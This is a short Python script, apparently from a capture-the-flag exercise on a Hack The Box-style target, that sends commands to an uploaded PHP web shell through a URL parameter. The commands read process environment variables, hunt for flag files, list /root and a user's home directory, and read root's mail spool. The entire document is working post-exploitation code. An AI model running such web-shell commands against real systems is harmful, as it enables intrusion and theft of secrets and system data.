import urllib.request, urllib.parse

url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -i flag; echo N1; env | grep -i flag; echo N2; find /var/www -type f -name 'user.txt' -o -name 'flag*' 2>/dev/null; echo N3; ls -la /root/ 2>&1; echo N4; cat /var/spool/mail/root 2>&1 | head -20; echo N5; ls /home/haris/ 2>&1"})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
try:
    resp = urllib.request.urlopen(req, timeout=15)
    result = resp.read().decode("utf-8", errors="replace").strip()
    print(result[:3000])
except Exception as e:
    print(f"Error: {e}")
